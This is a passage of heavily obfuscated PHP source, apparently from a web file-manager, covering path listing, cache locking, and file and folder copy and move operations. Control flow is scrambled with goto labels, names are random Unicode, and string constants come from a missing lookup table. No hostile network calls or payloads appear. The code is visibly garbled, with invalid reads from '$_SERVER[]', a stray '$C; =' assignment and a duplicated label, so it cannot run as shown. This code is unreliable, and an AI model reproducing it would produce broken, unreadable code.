Model($e[458])->getInfo($F[$e[456]]); goto Eзɤ藿; D褢: $F[$e[460]] = $C[$e[461]]; $F[$e[380]] = $C[$e[459]]; $F[$e[462]] = $C[$e[463]]; goto dޒň; dޒň: $F[$e[464]] = $EŜ . $C[$e[391]][$e[369]]; goto f; Eзɤ藿: $Fᾯ = $this->parentLevelArray($C[$e[459]]); $EŜ = $e[33]; foreach ($Fᾯ as $Eտъ) { $Eؖ = Model($e[458])->getInfo($Eտъ); $EŜ .= $Eؖ[$e[391]][$e[369]] . $e[47]; } goto D褢; f: } protected function _listAppendPath(&$AƠ) { goto F셢ޏ; F셢ޏ: $c =& $_SERVER[]; $f̤ = array(); foreach ($AƠ as &$e) { $f̤[$e[$c[369]]] = $e[$c[28]]; $f = $this->parentLevelArray($e[$c[459]]); array_shift($f); foreach ($f as $Eۖ) { if (!isset($f̤[$Eۖ])) { $f̤[$Eۖ] = 0; } } } goto CՋٵ; CՋٵ: $CϏ = array(); foreach ($f̤ as $E֍ => $bּȅ) { if (!$bּȅ) { $CϏ[] = $E֍; } } if ($CϏ) { $e = array($c[383] => array($c[384], $CϏ)); if (count($CϏ) == 1) { $c = $this->sourceInfo($CϏ[0]); $c = is_array($c) ? array($c) : !1; } else { $c = $this->field($c[465])->where($e)->select(); } $a췅 = array_to_keyvalue($c, $c[369], $c[28]); $f̤ = array_merge_index($f̤, $a췅); } goto Bޫ; Bޫ: $DΎ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($AƠ as &$e) { goto d; f: if ($f) { $bג .= $e[$c[28]]; } if ($e[$c[370]]) { $bג .= $c[8]; } $e[$c[466]] = str_replace($c[467], $c[8], $bג); goto Cߧ; Cߧ: $e󊸖 = trim($e[$c[466]], $c[8]); if ($e[$c[461]] == $c[468] && $e󊸖) { $e[$c[28]] = $e󊸖; } $this->_listAppendPathRecycle($e, $f, $DΎ); goto b둖®; d: $f = $this->parentLevelArray($e[$c[459]]); $bג = $this->_listAppendPathRoot($e, $f); foreach ($f as $Eۖ) { if (isset($f̤[$Eۖ])) { $bג .= $f̤[$Eۖ] . $c[8]; } } goto f; b둖®: } goto A۱÷; A۱÷: } private function _listAppendPathRecycle(&$FȰ», $B𣼳, $d˪) { goto F淅ڬ; F淅ڬ: $BÈ =& $_SERVER[]; if (intval($FȰ»[$BÈ[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($d˪, $B𣼳) && $FȰ»[$BÈ[369]] != $d˪) { return; } goto e΢Å; e΢Å: $bߎ = explode($BÈ[8], trim($FȰ»[$BÈ[466]], $BÈ[8])); $b = implode($BÈ[8], array_slice($bߎ, 2)); $FȰ»[$BÈ[466]] = $BÈ[8] . LNG($BÈ[469]) . $BÈ[8] . ltrim($b, $BÈ[8]); goto c; c: $FȰ»[$BÈ[459]] = $BÈ[470] . implode($BÈ[47], array_slice($B𣼳, 1)) . $BÈ[47]; if ($FȰ»[$BÈ[369]] == $d˪) { $FȰ»[$BÈ[459]] = $BÈ[470]; $FȰ»[$BÈ[461]] = $BÈ[468]; $FȰ»[$BÈ[28]] = LNG($BÈ[469]); } $FȰ»[$BÈ[471]] = $BÈ[472]; goto E֣͕; E֣͕: } protected function _listAppendPathRoot(&$aО, $a) { $A޲ =& $_SERVER[]; $b󶝃 = $A޲[33]; if ($aО[$A޲[371]] == self::TYPE_USER) { if (defined($A޲[427]) && $aО[$A޲[456]] == USER_ID) { $b󶝃 = LNG($A޲[473]); if (!$a) { $aО[$A޲[28]] = $b󶝃; } } else { $BϿ͇ = Model($A޲[474])->getInfoSimple($aО[$A޲[456]]); $b󶝃 = LNG($A޲[475]) . $A޲[157] . $BϿ͇[$A޲[28]] . $A޲[476]; } } else { if ($aО[$A޲[371]] == self::TYPE_GROUP) { $BϿ͇ = Model($A޲[458])->getInfoSimple($aО[$A޲[456]]); $b󶝃 = $BϿ͇[$A޲[28]]; } else { if ($aО[$A޲[371]] == self::TYPE_SYSTEM) { $BϿ͇ = $this->sourceInfo($a[0], !0); $b󶝃 = $BϿ͇[$A޲[28]]; } } } $b󶝃 = $b󶝃 ? $A޲[8] . $b󶝃 . $A޲[8] : $A޲[8]; return $b󶝃; } protected function _listAppendUser(&$B״܎) { $cН =& $_SERVER[]; $D䮗 = array_to_keyvalue($B״܎, $cН[33], $cН[378]); $C뾈 = array_to_keyvalue($B״܎, $cН[33], $cН[379]); $FՏ = array_merge($D䮗, $C뾈); $d̏ = Model($cН[477])->userListInfo($FՏ); foreach ($B״܎ as &$a) { $aտš = $a[$cН[378]]; $a[$cН[378]] = $d̏[$aտš] ? $d̏[$aտš] : !1; $aտš = $a[$cН[379]]; $a[$cН[379]] = $d̏[$aտš] ? $d̏[$aտš] : !1; if (isset($a[$cН[417]]) && $a[$cН[417]][$cН[478]]) { $C֋ = $GLOBALS[$cН[6]][$cН[84]][$cН[479]]; if ($a[$cН[417]][$cН[480]] <= time() - $C֋) { $this->metaSet($a[$cН[369]], $cН[478], null); $this->metaSet($a[$cН[369]], $cН[480], null); unset($a[$cН[417]][$cН[478]]); continue; } $Fɚ = $a[$cН[417]][$cН[478]]; $a[$cН[417]][$cН[481]] = Model($cН[477])->getInfoSimpleOuter($Fɚ); } } } public function parentLevelArray($dэ) { $fݑג =& $_SERVER[]; $dэ = explode($fݑג[47], trim($dэ, $fݑג[47])); return array_remove_value($dэ, $fݑג[468]); } public function listAll($fڌ) { goto cՃ; f: $E߉ͻ = $C¹[486]; $C; = "\114\x45\106\124\x20\112\117\x49\116\40{$this->tablePrefix}\x69\157\137\x66\151\x6c\145\40\146\x69\x6c\x65\x20\x6f\156\x20\x73\x6f\x75\162\x63\x65\x2e\x66\x69\x6c\x65\x49\x44\40\75\x20\x66\151\x6c\x65\x2e\x66\151\154\145\111\104"; $dކ賌 = $this->alias($C¹[487])->field($E߉ͻ)->where($F)->join($C;)->select(); goto F򷣃; F򷣃: $this->_listAppendAuth($dކ賌); $this->_listAppendUser($dކ賌); $this->_listAppendPath($dކ賌); goto Fȃ; cՃ: $C¹ =& $_SERVER[]; $B = $this->sourceInfo($fڌ); $F = array($C¹[482] => array($C¹[483], $B[$C¹[459]] . $fڌ . $C¹[484]), $C¹[485] => 0); goto f; Fȃ: $dކ賌 = array_to_keyvalue($dކ賌, $C¹[369]); $B = "\57{$B[$C¹[28]]}\57"; $B = $B == $C¹[467] ? $C¹[8] : $B; goto Aߜ; Aߜ: $Dɴʇə = array(); foreach ($dކ賌 as $D => $E֬ϧ) { goto bނ; Dٻ: for ($a͐ = 0; $a͐ < count($b); $a͐++) { $Eد .= $dކ賌[$b[$a͐]][$C¹[28]] . $C¹[8]; } $Eد .= $E֬ϧ[$C¹[28]]; if ($E֬ϧ[$C¹[370]]) { $Eد .= $C¹[8]; } goto e; E: if (!$E֬ϧ[$C¹[370]]) { $E⶯[$C¹[419]] = $E֬ϧ[$C¹[419]]; $E⶯[$C¹[489]] = $E֬ϧ[$C¹[75]]; } $Dɴʇə[] = $E⶯; goto A; e: $Eد = str_replace($C¹[467], $C¹[8], $Eد); $Eد = str_replace($C¹[467], $C¹[8], $Eد); $E⶯ = array($C¹[387] => str_replace($C¹[467], $C¹[8], $Eد), $C¹[488] => intval($E֬ϧ[$C¹[370]]), $C¹[391] => $this->pathInfoFilter($E֬ϧ, !0)); goto E; bނ: $b = $this->parentLevelArray($E֬ϧ[$C¹[459]]); array_shift($b); $Eد = $B; goto Dٻ; A: } return $Dɴʇə; goto F; F: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($d缊) { goto c찰; c찰: $b =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($b[490], $d缊); goto F; F: $C = 1; $this->_lockEvent($d缊, array($b[491], $b[492]), $C); $this->_lockParent($d缊, array($b[492]), $C); goto A; A: $this->_lockEvent($d缊, array($b[493], $b[494]), $C); $this->_lockCheckEnd($b[490], $d缊); goto c񻐠; c񻐠: } public function lockCopyEnd($Dخ) { $aՓЧ =& $_SERVER[]; if (!$this->allowLock()) { return; } $Cש = 0; $this->_lockEvent($Dخ, array($aՓЧ[491], $aՓЧ[492]), $Cש); $this->_lockParent($Dخ, array($aՓЧ[492]), $Cש); $this->_lockEvent($Dخ, array($aՓЧ[493], $aՓЧ[494]), $Cש); } public function lockWriteStart($e҃, $dϒ = '') { goto eƫ; eƫ: $eٛ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($eٛ[491], $e҃); goto BҘָ; Dח: $this->_lockParent($e҃, array($eٛ[490], $eٛ[492]), $c՟Ϥ); $this->_lockCheckEnd($eٛ[491], $e҃); goto C; BҘָ: $c՟Ϥ = 1; $this->_lockKey($eٛ[495] . $e҃ . $eٛ[91] . $dϒ, $c՟Ϥ); $this->_lockEvent($e҃, array($eٛ[490], $eٛ[492]), $c՟Ϥ); goto Dח; C: } public function lockWriteEnd($dُɷ, $aؔ = '') { $a =& $_SERVER[]; if (!$this->allowLock()) { return; } $B = 0; $this->_lockKey($a[495] . $dُɷ . $a[91] . $aؔ, $B); $this->_lockEvent($dُɷ, array($a[490], $a[492]), $B); $this->_lockParent($dُɷ, array($a[490], $a[492]), $B); } public function lockMoveStart($b̸Ð) { goto c낮; e֙: $aȎ = 1; $this->_lockKey($Eֶ[496] . $b̸Ð, $aȎ); $this->_lockEvent($b̸Ð, array($Eֶ[490], $Eֶ[491]), $aȎ); goto B; B: $this->_lockParent($b̸Ð, array($Eֶ[490], $Eֶ[492]), $aȎ); $this->_lockEvent($b̸Ð, array($Eֶ[497], $Eֶ[493], $Eֶ[494]), $aȎ); $this->_lockCheckEnd($Eֶ[492], $b̸Ð); goto A; c낮: $Eֶ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($Eֶ[492], $b̸Ð); goto e֙; A: } public function lockMoveEnd($a܄Ί) { goto e; e: $b =& $_SERVER[]; if (!$this->allowLock()) { return; } $aߺ = 0; goto E﮹; E﮹: $this->_lockKey($b[496] . $a܄Ί, $aߺ); $this->_lockEvent($a܄Ί, array($b[490], $b[491]), $aߺ); $this->_lockParent($a܄Ί, array($b[490], $b[492]), $aߺ); goto e; e: $this->_lockEvent($a܄Ί, array($b[497], $b[493], $b[494]), $aߺ); goto f뛕; f뛕: } private function _lockCheck($A뾬, $DȪݷ) { goto d; b捍: $c = array_reverse($this->parentLevelArray($A[$D֒[459]])); foreach ($c as $F쉻) { $C = $A뾬 . $D֒[499] . $F쉻; if (CacheLock::lockGet($D֒[500] . $C)) { $A = $this->sourceInfo($F쉻); CacheLock::setErrorMsg($D֒[157] . htmlspecialchars($A[$D֒[28]]) . $D֒[476] . $D֗); $this->_lockKey($C, 1); $this->_lockKey($C, 0); } } goto B; F񰗉: $this->_lockTimeStart[$C] = timeFloat(); if (!is_array($A)) { return; } $D֗ = LNG($D֒[498]); goto e뙢; d: $D֒ =& $_SERVER[]; $A = $this->sourceInfo($DȪݷ); $C = $A뾬 . $D֒[91] . $DȪݷ; goto F񰗉; e뙢: CacheLock::setErrorMsg($D֒[157] . htmlspecialchars($A[$D֒[28]]) . $D֒[476] . $D֗); $this->_lockKey($C, 1); $this->_lockKey($C, 0); goto b捍; B: } private function _lockCheckEnd($D㒽, $F¤ϝ) { goto Bă; eź: if (!isset($this->_lockTimeStart[$EƘ])) { return; } $EސШ = timeFloat() - $this->_lockTimeStart[$EƘ]; unset($this->_lockTimeStart[$EƘ]); goto a; Bă: $D߅ =& $_SERVER[]; $EƘ = $D㒽 . $D߅[91] . $F¤ϝ; CacheLock::setErrorMsg($D߅[361]); goto eź; a: if ($EސШ > 0.5) { unset(self::$cacheSourceInfo[$D߅[410] . $F¤ϝ]); } $cϏ = $this->sourceInfo($F¤ϝ); if (!$cϏ) { show_json(LNG($D߅[101]), !1); } goto cÂ; cÂ: } private function _lockParent($d풒, $C, $e) { if (!$this->autoLockSet) { return; } $fӓǃ = $this->sourceInfo($d풒); if (!is_array($fӓǃ)) { return; } $aڵ = array_reverse($this->parentLevelArray($fӓǃ[$_SERVER[][459]])); foreach ($aڵ as $F) { $this->_lockEvent($F, $C, $e); } } private function _lockEvent($BחƼ, $e, $a˟) { $E먴 =& $_SERVER[]; if (!$this->autoLockSet) { return; } foreach ($e as $Bؖ) { $d = $Bؖ . $E먴[91] . $BחƼ; if ($a˟ && CacheLock::lockGet($E먴[500] . $d)) { continue; } $this->_lockKey($d, $a˟); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($b̈́, $eƃ = 1) { $fڐ = $_SERVER[][500] . md5($b̈́); if ($eƃ) { if (isset(self::$_lockItemArr[$fڐ])) { return; } self::$_lockItemArr[$fڐ] = 1; CacheLock::lock($fڐ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$fڐ])) { return; } unset(self::$_lockItemArr[$fڐ]); CacheLock::unlock($fڐ); } } public function isParentOf($b݂, $D޳) { goto C̵; C: $c = $bՌ[$cﳑ[459]] . $bՌ[$cﳑ[369]] . $cﳑ[47]; $D䍸 = $bґ[$cﳑ[459]] . $bґ[$cﳑ[369]] . $cﳑ[47]; $eэ = strpos($D䍸, $c) === 0; goto Fե; Fե: return $eэ; goto b̕; C̵: $cﳑ =& $_SERVER[]; $bՌ = $this->sourceInfo($b݂); $bґ = $this->sourceInfo($D޳); goto C; b̕: } private $targetIsDelete = 0; public function copy($f羼, $F, $dח = REPEAT_REPLACE, $aߏ = '') { goto E˂; E݃: $this->saveAll($B[$a[503]]); Model($a[167])->linkAdd($B[$a[501]]); $this->folderSizeReset($F); goto c; fה: if ($c[$a[370]] == $a[83] && $e妜 == $cΪ) { $this->folderSizeResetChildren($e妜); } Model($a[504])->addAll($B[$a[502]], array(), !0); if ($e妜 != $cΪ || $c[$a[370]] == $a[83]) { Model($a[505])->eventCopy($cΪ); } goto E݃; b: $this->targetIsDelete = intval($c[$a[397]]); $e妜 = $this->fileNameExistCache($F, $c[$a[28]]); $cΪ = $this->_copy($f羼, $F, $dח, $B, !0, $aߏ); goto F̠; c: $this->updateModifyTime($F); return $cΪ; goto e; Bީ: if (!$c || !$e˜ || $e˜[$a[370]] != $a[83]) { return !1; } if ($this->isParentOf($f羼, $F)) { return !1; } $eꟐ = $aߏ ? $aߏ : $c[$a[28]]; goto E; E˂: $a =& $_SERVER[]; $c = $this->sourceInfo($f羼); $e˜ = $this->sourceInfo($F); goto Bީ; F̠: $this->_childrenListClear(); $this->lockCopyEnd($f羼); $this->lockWriteEnd($F, $eꟐ); goto fה; E: $this->lockCopyStart($f羼); $this->lockWriteStart($F, $eꟐ); $B = array($a[501] => array(), $a[502] => array(), $a[503] => array()); goto b; e: } private function _copy($aН, $F§, $E, &$a, $b, $aՃ = '') { goto A˫; BÔ: if (!$cճ竾) { return $this->_copyCreate($aН, $F§, $a򾤆, $a); } $F = $cճ竾; if ($eӻ) { if ($E == REPEAT_RENAME_FOLDER) { $a򾤆 = $this->fileNameAutoCache($F§, $a򾤆, $E, $eӻ); $F = $this->_copyCreate($aН, $F§, $a򾤆, $a); } else { $bؐ = $this->_childrenList($aН); foreach ($bؐ as $B) { $this->_copy($B[$fꑂ[369]], $cճ竾, $E, $a, !1); } } } else { if ($E == REPEAT_RENAME || $E == REPEAT_RENAME_FOLDER) { $a򾤆 = $this->fileNameAutoCache($F§, $a򾤆, $E, $eӻ); $F = $this->_copyCreate($aН, $F§, $a򾤆, $a); } else { if ($E == REPEAT_REPLACE) { $D = $this->sourceInfoCache($cճ竾); $eބҐ = $this->fileHistory($D, $B[$fꑂ[419]], $B[$fꑂ[77]]); if ($eބҐ) { $a[$fꑂ[501]][] = $B[$fꑂ[419]]; } } else { if ($E == REPEAT_SKIP) { } } } Hook::trigger($fꑂ[506], array($fꑂ[507], $B, 0)); } goto Dݕ䉨; Dݕ䉨: return $F; goto aˈ; D舶: $a򾤆 = $aՃ ? $aՃ : $B[$fꑂ[28]]; $cճ竾 = $this->fileNameExistCache($F§, $a򾤆); if ($b) { $this->_childrenAllMake($aН); if ($eӻ && $cճ竾) { $this->_childrenAllMake($cճ竾); } } goto BÔ; A˫: $fꑂ =& $_SERVER[]; $B = $this->sourceInfoCache($aН); $eӻ = $B[$fꑂ[370]] == $fꑂ[83]; goto D舶; aˈ: } private function _copyCreate($f߽, $cՋ, $aʸ, &$eś) { goto FѬ; eβ: $B۪ = $this->add($CĴ); $Cı؃ = array($a۷[369] => $B۪, $a۷[28] => $aʸ); $this->_copyApplyMeta($Cı؃, $eś); goto e֠靕; bޡ: $aͧ[$f߽] = $B۪; $f = array(); $Dʆ = array(); goto E; C이ヨ: $this->addAll($aҖ, array(), !1); $B׋ʕ = $this->where(array($a۷[461] => $B۪))->select(); $aͧ = $this->_childrenMakeRelation($E숌ū, $B׋ʕ); goto bޡ; FѬ: $a۷ =& $_SERVER[]; $Bɇ = $this->sourceInfoCache($f߽); $a˃뺰 = $this->sourceInfoCache($cՋ); goto FЬ; E: foreach ($B׋ʕ as $cИ) { $D = $cИ[$a۷[369]]; $bᑉ = $this->_childrenMatch($aͧ, $cИ, $E); $f[] = array($a۷[369], $D, $a۷[461], $bᑉ[$a۷[461]]); $Dʆ[] = array($a۷[369], $D, $a۷[459], $bᑉ[$a۷[459]]); $this->_copyApplyMeta($cИ, $eś); if ($cИ[$a۷[370]] != $a۷[83]) { $eś[$a۷[501]][] = $cИ[$a۷[419]]; } } $this->chunkEventSet($a۷[513], array($a۷[514], $CĴ, $B)); $this->saveAll($f); goto bދ; aј: $this->_childrenListAll($f߽, $E숌ū); $B = count($E숌ū); if ($B == 0) { return $B۪; } goto c; bދ: $this->chunkEventSet($a۷[515], array($a۷[516], $CĴ, $B)); $this->saveAll($Dʆ); return $B۪; goto aאַ; e֠靕: if ($Bɇ[$a۷[370]] != $a۷[83]) { $eś[$a۷[501]][] = $Bɇ[$a۷[419]]; return $B۪; } $E숌ū = array(); $aҖ = array(); goto aј; FЬ: $CĴ = $this->_makeItemData($Bɇ, $a˃뺰, $aʸ); Hook::trigger($a۷[508], $CĴ); Hook::trigger($a۷[509], array($a۷[510], $CĴ, 0)); goto eβ; c: $E = $this->sourceInfo($B۪); foreach ($E숌ū as $cИ) { $d򉬜 = $this->_makeItemData($cИ, $E, $cИ[$a۷[28]]); $d򉬜[$a۷[459]] = $cИ[$a۷[459]]; $aҖ[] = $d򉬜; } $this->chunkEventSet($a۷[511], array($a۷[512], $CĴ, $B)); goto C이ヨ; aאַ: } private function _childrenMakeRelation($a, $DǄ̎) { $eǇ =& $_SERVER[]; $Bǉ = array(); $b鄆 = array(); foreach ($a as $Dӛ) { $Aܯ = $Dӛ[$eǇ[28]] . $eǇ[8] . $Dӛ[$eǇ[459]]; $Bǉ[$Aܯ] = $Dӛ[$eǇ[369]]; } foreach ($DǄ̎ as $Dӛ) { $Aܯ = $Dӛ[$eǇ[28]] . $eǇ[8] . $Dӛ[$eǇ[459]]; $F = $Bǉ[$Aܯ]; $b鄆[$F] = $Dӛ[$eǇ[369]]; } return $b鄆; } private function _childrenMatch($AÌ, $f䆤, $EЈߋ) { goto E߂; CԱԾ: $D = $E޹[count($E޹) - 1]; return array($E[461] => $D, $E[459] => $f); goto f; Eǒ: foreach ($Eɕ as $f⺳) { if (isset($AÌ[$f⺳])) { $f .= $AÌ[$f⺳] . $E[517]; } } $f = rtrim($f, $E[47]) . $E[47]; $E޹ = $this->parentLevelArray($f); goto CԱԾ; E߂: $E =& $_SERVER[]; $f = $EЈߋ[$E[459]]; $Eɕ = $this->parentLevelArray($f䆤[$E[459]]); goto Eǒ; f: } private function _makeItemData($eú, $cͫ𛈅, $f) { $FƄ =& $_SERVER[]; $d = array($FƄ[518] => $eú[$FƄ[370]], $FƄ[386] => $f, $FƄ[519] => $eú[$FƄ[372]], $FƄ[420] => $eú[$FƄ[419]], $FƄ[520] => $eú[$FƄ[77]], $FƄ[521] => $cͫ𛈅[$FƄ[371]], $FƄ[522] => $cͫ𛈅[$FƄ[456]], $FƄ[523] => USER_ID, $FƄ[524] => USER_ID, $FƄ[368] => $cͫ𛈅[$FƄ[369]], $FƄ[525] => $cͫ𛈅[$FƄ[459]] . $cͫ𛈅[$FƄ[369]] . $FƄ[47], $FƄ[396] => 0, $FƄ[526] => $FƄ[33]); return $d; } private function _copyApplyMeta($D, &$bٕБ) { $Eب =& $_SERVER[]; $bו͂ = $D[$Eب[369]]; $aĘ = $D[$Eب[28]]; if (!isset($D[$Eب[527]]) || !$D[$Eب[527]] || $D[$Eب[527]] == $Eب[468]) { $bٕБ[$Eب[503]][] = array($Eب[369], $bו͂, $Eب[527], short_id($bו͂)); } if (Input::check($aĘ, $Eب[528])) { $bٕБ[$Eب[502]][] = array($Eب[369] => $bו͂, $Eب[89] => $Eب[416], $Eب[359] => str_replace($Eب[50], $Eب[33], Pinyin::encode($aĘ))); $bٕБ[$Eب[502]][] = array($Eب[369] => $bו͂, $Eب[89] => $Eب[415], $Eب[359] => Pinyin::encode($aĘ, $Eب[529])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($e҉) { goto c; a뚪: $fޛ荑 = array_to_keyvalue($fޛ荑, $F͔[369]); foreach ($fޛ荑 as $FԂ) { $E = $FԂ[$F͔[461]]; $e҉ = $FԂ[$F͔[369]]; if (!isset($this->_childrenListCache[$e҉]) && $FԂ[$F͔[370]] == $F͔[83]) { $this->_childrenListCache[$e҉] = array(); } if (!isset($this->_childrenListCache[$E])) { $this->_childrenListCache[$E] = array(); } $this->_childrenListCache[$E][$e҉] = $FԂ; $this->_childrenItemCache[$e҉] = $FԂ; } goto Aӹ; a֜: $C = array($F͔[459] => array($F͔[483], $b[$F͔[459]] . $e҉ . $F͔[484]), $F͔[397] => $this->targetIsDelete); $fޛ荑 = $this->field($A㛘)->where($C)->select(); if (!$fޛ荑) { return; } goto a뚪; c: $F͔ =& $_SERVER[]; $b = $this->sourceInfo($e҉); $A㛘 = $F͔[530]; goto a֜; Aӹ: } private function _childrenListAll($b, &$Cߖ) { $c׬騟 =& $_SERVER[]; if (!isset($this->_childrenListCache[$b])) { return; } $a = $this->_childrenListCache[$b]; foreach ($a as $fْƺ => $aҴ) { $Cߖ[$fْƺ] = $aҴ; if ($aҴ[$c׬騟[370]] == $c׬騟[83]) { $this->_childrenListAll($fْƺ, $Cߖ); } } } private function sourceInfoCache($d) { if (isset($this->_childrenItemCache[$d])) { return $this->_childrenItemCache[$d]; } return $this->sourceInfo($d); } private function _childrenList($d߸Ñ) { if (isset($this->_childrenListCache[$d߸Ñ])) { return $this->_childrenListCache[$d߸Ñ]; } return $this->_childrenListSelect($d߸Ñ); } private function _childrenListSelect($eܪ) { goto A; Aۚɕ: foreach ($fה as $eܪ => $c˞) { $this->_childrenItemCache[$eܪ] = $c˞; } return $fה; goto cߑ; C̴ɘ: $D = $D ? $D : array(); $fה = array_to_keyvalue($D, $C۳ނ[369]); $this->_childrenListCache[$eܪ] = $fה; goto Aۚɕ; A: $C۳ނ =& $_SERVER[]; $d = array($C۳ނ[461] => $eܪ, $C۳ނ[397] => $this->targetIsDelete); $D = $this->where($d)->select(); goto C̴ɘ; cߑ: } private function fileNameExistCache($A⽆, $E) { $Aĵ㨐 =& $_SERVER[]; $E = strtolower($E); $F = $this->_childrenList($A⽆); foreach ($F as $a؋) { if ($E == strtolower($a؋[$Aĵ㨐[28]])) { return $a؋[$Aĵ㨐[369]]; } } return !1; } private function fileNameAutoCache($Aꦄ, $dЃͶ, $Bхн, $Cؙ) { $AΟ =& $_SERVER[]; $aأ = $this->_childrenList($Aꦄ); $D = array_to_keyvalue($aأ, $AΟ[33], $AΟ[28]); return $this->fileNameAutoGet($D, $dЃͶ, $Bхн, $Cؙ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($dҫ, $e, $c鲭 = REPEAT_REPLACE, $Aі깑 = '') { goto dʔ; b݇Ϻ: return $b﵈; goto cӇ˘; eȭ: if ($fޒ[$b[370]] == $b[83] && $ḛƒ) { $this->folderSizeResetChildren($b﵈); } Model($b[167])->linkAdd($C[$b[501]]); if ($ḛƒ && $C[$b[533]]) { $this->removeNow($dҫ, !1); } goto EƎ; E: if ($fޒ[$b[461]] == $E[$b[369]]) { if ($fޒ[$b[397]] == $b[83]) { Model($b[395])->restore(array($dҫ)); } return $dҫ; } $Aљ΋ = $this->pathInfoMore($dҫ); if ($this->isParentOf($dҫ, $e)) { return !1; } goto d쟄贋; F: $this->updateModifyTime($b֦½); Model($b[505])->eventMove($dҫ, $fޒ[$b[461]], $e); Hook::trigger($b[532], $Aљ΋); goto b݇Ϻ; dʔ: $b =& $_SERVER[]; $fޒ = $this->sourceInfo($dҫ); $E = $this->sourceInfo($e); goto E; d؍ͣ: $this->lockWriteStart($e, $eđ); $C = array($b[501] => array(), $b[533] => !1); $this->clearShare($dҫ, $e); goto a; aև˚: $this->folderSizeReset($e); $b֦½ = array($fޒ[$b[461]], $e); if ($fޒ[$b[370]] == $b[83]) { $b֦½[] = $dҫ; } goto F; d쟄贋: if (!$fޒ || !$E || $E[$b[370]] != $b[83]) { return !1; } Hook::trigger($b[531], $Aљ΋); $this->targetIsDelete = intval($fޒ[$b[397]]); goto e佬Ͷ; e佬Ͷ: if ($fޒ[$b[461]] == $e && $Aі깑 != $fޒ[$b[28]]) { $D̈́ = $this->fileNameExist($e, $Aі깑); if ($D̈́ && $fޒ[$b[370]] == $b[468]) { goto bԿִ; C: $this->removeNow($dҫ, !1); $this->folderSizeReset($e); Hook::trigger($b[532], $Aљ΋); goto fŋ; fŋ: return $D̈́; goto d; bԿִ: $Cӄï = $this->sourceInfo($D̈́); $d̠ = $this->fileHistory($Cӄï, $fޒ[$b[419]], $fޒ[$b[77]]); if (!$d̠) { Model($b[422])->remove($fޒ[$b[419]]); } goto C; d: } } $eđ = $Aі깑 ? $Aі깑 : $fޒ[$b[28]]; $this->lockMoveStart($dҫ); goto d؍ͣ; a: $ḛƒ = $this->fileNameExistCache($e, $fޒ[$b[28]]); $b﵈ = $this->_move($dҫ, $e, $c鲭, $C, $Aі깑); $this->sourceCacheClear(); goto eȭ; EƎ: $this->lockMoveEnd($dҫ); $this->lockWriteEnd($e, $eđ); $this->folderSizeReset($fޒ[$b[461]]); goto aև˚; cӇ˘: } private function _move($c蚥, $A։, $E祃, &$B𳡙, $cŧӏ = '') { goto dٍ; f􅳕: $eֲ = !1; if ($aʨ) { if ($E祃 == REPEAT_RENAME_FOLDER) { $Fƛ = $this->fileNameAuto($A։, $Fƛ, $E祃, $aʨ); $d = $this->_moveForce($c蚥, $A։, $Fƛ); } else { if ($E祃 == REPEAT_RENAME_FOLDER) { $E祃 = REPEAT_RENAME; } $D = $this->_childrenListSelect($c蚥); foreach ($D as $F) { $this->_move($F[$b[369]], $c, $E祃, $B𳡙); } $eֲ = !0; } } else { if ($E祃 == REPEAT_SKIP) { $eֲ = !0; } else { if ($E祃 == REPEAT_RENAME || $E祃 == REPEAT_RENAME_FOLDER) { $Fƛ = $this->fileNameAuto($A։, $Fƛ, $E祃, $aʨ); $d = $this->_moveForce($c蚥, $A։, $Fƛ); } else { if ($E祃 == REPEAT_REPLACE) { $eͱ٦ = $this->sourceInfoCache($c); $aу = $this->fileHistory($eͱ٦, $A؊[$b[419]], $A؊[$b[77]]); if ($aу) { $B𳡙[$b[501]][] = $A؊[$b[419]]; } else { $eֲ = !0; } } } } } if ($eֲ && !$B𳡙[$b[533]]) { $B𳡙[$b[533]] = !0; } goto A; CÞ: $Fƛ = $cŧӏ ? $cŧӏ : $A؊[$b[28]]; $c = $this->fileNameExistCache($A։, $Fƛ); $this->lockMoveStart($c蚥); goto B֖; B֖: $this->lockWriteStart($A։, $Fƛ); if (!$c) { return $this->_moveForce($c蚥, $A։, $Fƛ); } $d = $c; goto f􅳕; dٍ: $b =& $_SERVER[]; $A؊ = $this->sourceInfo($c蚥); $aʨ = $A؊[$b[370]] == $b[83]; goto CÞ; A: return $d; goto c; c: } private function _moveForce($f뉎ۥ, $B, $Cӗ) { goto B⸅; BΔ馔: $bպ = $f籃[$dұ[370]] == $dұ[83]; $B܏ = array($dұ[368] => $c[$dұ[369]], $dұ[525] => $c[$dұ[459]] . $c[$dұ[369]] . $dұ[47], $dұ[521] => $c[$dұ[371]], $dұ[522] => $c[$dұ[456]], $dұ[524] => USER_ID, $dұ[386] => $Cӗ); $a£͙ = $f籃[$dұ[371]] == SourceModel::TYPE_GROUP && $c[$dұ[371]] == SourceModel::TYPE_GROUP && $f籃[$dұ[456]] == $c[$dұ[456]]; goto f㱾κ; f㱾κ: if (!$a£͙) { Model($dұ[454])->authClear($f뉎ۥ); } $a = $f籃[$dұ[397]] == $dұ[83] && $c[$dұ[397]] != $dұ[83]; if ($a) { $B܏[$dұ[396]] = 0; } goto Cꠅ; B⸅: $dұ =& $_SERVER[]; $f籃 = $this->sourceInfo($f뉎ۥ); $c = $this->sourceInfo($B); goto BΔ馔; Cꠅ: if ($bպ) { $cŔЃ = array($dұ[525] => array($dұ[483], $f籃[$dұ[459]] . $f籃[$dұ[369]] . $dұ[484])); $C = $f籃[$dұ[459]] . $f籃[$dұ[369]] . $dұ[47]; $Cѕ = $c[$dұ[459]] . $c[$dұ[369]] . $dұ[47] . $f籃[$dұ[369]] . $dұ[47]; $F볪 = array($dұ[525] => array($dұ[534], "\x72\x65\x70\154\x61\x63\145\x28\x70\x61\162\x65\156\164\x4c\145\x76\x65\x6c\x2c\47{$C}\47\54\47{$Cѕ}\x27\51"), $dұ[521] => $c[$dұ[371]], $dұ[522] => $c[$dұ[456]]); if ($a) { 